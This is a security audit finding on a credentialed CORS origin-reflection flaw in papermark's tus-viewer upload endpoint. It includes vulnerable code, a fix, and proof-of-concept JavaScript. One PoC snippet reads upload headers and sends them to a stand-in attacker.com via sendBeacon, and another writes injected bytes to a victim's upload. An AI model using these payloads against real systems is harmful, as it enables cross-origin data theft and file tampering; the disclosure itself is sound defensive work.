# Finding: tus-viewer CORS Reflects Origin with Credentials

## Severity
CRITICAL

## CVSS Estimate
CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N = 8.2 (any malicious site can make credentialed cross-origin reads of TUS session state; chained with transitive CVEs it reaches 9+).

## Affected Code
- File: `pages/api/file/tus-viewer/[[...file]].ts`
- Line: 234-250 (`setCorsHeaders` helper echoes `req.headers.origin` and sets `Access-Control-Allow-Credentials: true`), 252-263 (CORS headers set unconditionally before the session check)
- Function: `setCorsHeaders`, `handler` (default export)
- Endpoint: All methods on `/api/file/tus-viewer/[[...file]]` (POST, GET, OPTIONS, DELETE, PATCH, HEAD)

## Description
The `/api/file/tus-viewer` route is intentionally cross-origin (custom domains), so the developer added a CORS helper. The implementation is the **textbook misconfiguration**: it echoes the request `Origin` into `Access-Control-Allow-Origin` while also setting `Access-Control-Allow-Credentials: true`. The browser will then allow any attacker-controlled origin to make credentialed cross-origin requests (XHR/fetch with `credentials: 'include'`) and read the responses.

The session check is performed correctly by `verifyDataroomSessionInPagesRouter` inside the TUS `onIncomingRequest` hook (line 186-230), but **CORS headers are set unconditionally before the session check** (line 260 sets CORS, line 263 hands off to `tusServer.handle` which calls `onIncomingRequest`). The CORS layer pre-authorizes the request shape; the session check decides success vs 401/403. The browser sees the CORS preflight succeed, then sees a 200/401/403 response — **and the body of the 401/403 is now exposed cross-origin** to the attacker's JavaScript, which is enough to enumerate valid `linkId` × `viewerId` × `dataroomId` triples by observing which return 200 (valid session) vs 401/403 (invalid).

This is the publicly disclosed papermark Issue **#2178** (GHSA), confirmed in source.

## Proof of Concept

### Pre-conditions
- The victim has a valid `pm_drs_<linkId>` cookie (active dataroom viewer session). The session can be hours/days old.
- The victim visits `evil.com` while the dataroom session is active (the cookie is `sameSite=lax` so it's sent on top-level navigations; or `sameSite=none` if the dataroom is on a custom domain — verify the cookie config in `lib/auth/dataroom-auth.ts`).

### Step-by-step exploitation

1. **Victim in active dataroom session.** Cookie set: `pm_drs_<linkId>=<session>`.

2. **Attacker hosts `evil.com` with a payload:**
   ```html
   <script>
   // Probe the victim's TUS upload state
   fetch("https://app.papermark.com/api/file/tus-viewer/<victimUploadId>", {
     method: "HEAD",
     credentials: "include",
   })
     .then(r => r.headers.get("Upload-Offset"))
     .then(offset => {
       // Exfiltrate to attacker server
       navigator.sendBeacon("https://attacker.com/log", offset);
     })
     .catch(() => {});
   </script>
   ```

3. **CORS preflight** (if the browser sends OPTIONS — modern browsers do for non-simple requests): the server's `setCorsHeaders` helper at line 234-250 reflects `Origin: https://evil.com` into `Access-Control-Allow-Origin: https://evil.com` and sets `Access-Control-Allow-Credentials: true`. The browser allows the cross-origin credentialed request.

4. **TUS HEAD request** is sent with the victim's `pm_drs_<linkId>` cookie. CORS layer has already pre-authorized the request shape. The TUS server's `onIncomingRequest` hook (line 186-230) calls `verifyDataroomSessionInPagesRouter(req, linkId, dataroomId)`; if the session is valid, the response includes the upload's offset, length, and location. The browser allows the attacker to read these response headers (`Upload-Offset`, `Upload-Length`, `Location`) per the `Access-Control-Expose-Headers` list at line 246-249.

5. **(Chained — PATCH upload-id injection)** A second payload writes malicious bytes to the victim's in-progress upload:
   ```html
   <script>
   fetch("https://app.papermark.com/api/file/tus-viewer/<victimUploadId>", {
     method: "PATCH",
     credentials: "include",
     headers: {
       "Tus-Resumable": "1.0.0",
       "Upload-Offset": "0",
       "Upload-Length": "1024",
     },
     body: maliciousPDFBytes,
   });
   </script>
   ```
   The PATCH goes through `onIncomingRequest` (line 186-230), which verifies the session via `verifyDataroomSessionInPagesRouter` — succeeds because the cookie is valid. The bytes are appended to the victim's in-progress upload. On `onUploadFinish` (line 145-185), the file is finalized to S3 with the attacker's bytes as part of the content. The victim later sees the attacker's content embedded in their own document.

6. **(Chained — XSS via transitive CVE)** If the attacker can plant a malicious PDF in the victim's dataroom session (via the PATCH above), and the victim opens the document, the `pdfjs-dist@3.11.174` CVE (F-027) executes arbitrary JavaScript in the victim's session. See Chain 3 in `methodology-raw/05-chains.md`.

7. **Victim's browser** is now under the attacker's control (via the XSS) for the duration of the session. The attacker can call any other dataroom endpoint, exfiltrate all viewer-side state, and read every document in the dataroom.

## Impact
- **Credentialed cross-origin TUS state read/write**: any attacker origin can probe, read, and write in-progress uploads belonging to any victim with an active dataroom session.
- **Cross-origin file injection**: attacker can plant arbitrary bytes (including malicious PDFs that trigger transitive CVEs) in the victim's dataroom view.
- **XSS chain** (with F-027 pdfjs-dist or F-007 dompurify transitive CVEs) reaches arbitrary JS execution in the victim's session, with full dataroom read access.
- **CORS pre-authorization leaks auth state**: the difference between a 200 (valid session) and 401/403 (invalid session) is observable from the attacker's origin, enabling `linkId` × `viewerId` × `dataroomId` enumeration.

## Evidence
```ts
// pages/api/file/tus-viewer/[[...file]].ts:234-250
const setCorsHeaders = (req: NextApiRequest, res: NextApiResponse) => {
  // Set CORS headers
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Allow-Origin", req.headers.origin || "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS, DELETE, PATCH, HEAD");
  res.setHeader("Access-Control-Allow-Headers", "X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version, Upload-Length, Upload-Metadata, Upload-Offset, Tus-Resumable, Upload-Defer-Length, Upload-Concat");
  res.setHeader("Access-Control-Expose-Headers", "Upload-Offset, Location, Upload-Length, Tus-Version, Tus-Resumable, Tus-Max-Size, Tus-Extension, Upload-Metadata, Upload-Defer-Length, Upload-Concat");
};
```
```ts
// pages/api/file/tus-viewer/[[...file]].ts:252-264
export default function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === "OPTIONS") {
    setCorsHeaders(req, res);
    return res.status(204).end();
  }
  setCorsHeaders(req, res);          // ← CORS set unconditionally, before auth
  return tusServer.handle(req, res); // ← auth runs inside the TUS handler
}
```

## Methodology
- **M1 — Structural analysis** (`methodology-raw/01-structural-analysis.md` Finding 3)
- **M2 — Web synthesis** (`methodology-raw/03-web-synthesis.md` flagged via GH Issue #2178)
- **M3 — Web search** (`methodology-raw/03-web-search.md` confirmed public disclosure)
- **M7 — Chain synthesis** (`methodology-raw/05-chains.md` Chain 3)

## Chain Potential
- **Chain 3** (`methodology-raw/05-chains.md`) — the CORS misconfig is the **entry point**; the **chain** is CORS + pdfjs-dist / dompurify transitive CVEs → arbitrary JS in the victim's session.
- **F-014, F-015** (recon oracle + missing-auth progress token) — the same CORS misconfig could be exploited to enumerate valid `documentVersionId` values via the document-processing-status endpoint (which has its own auth gap, see F-015), amplifying the CORS impact.

## Remediation
Replace the wildcard `Origin` echo with an allowlist derived from the team's verified custom domains:
```ts
const setCorsHeaders = (req: NextApiRequest, res: NextApiResponse, allowedOrigins: string[]) => {
  const origin = req.headers.origin;
  if (origin && allowedOrigins.includes(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Credentials", "true");
  }
  res.setHeader("Vary", "Origin");
  // ... rest of headers (no credentials flag if not in allowlist)
};
```
Pass `allowedOrigins` from the team configuration (each team has `team.customDomains[]` — derive the origin from each domain). For papermark's own origin (`app.papermark.com`), add it explicitly.

Alternatively, use the `Access-Control-Allow-Origin: *` form for **public** responses only, and gate credentials on the team's custom-domain allowlist. The current code is a textbook example of "echo Origin with credentials" — never do this.
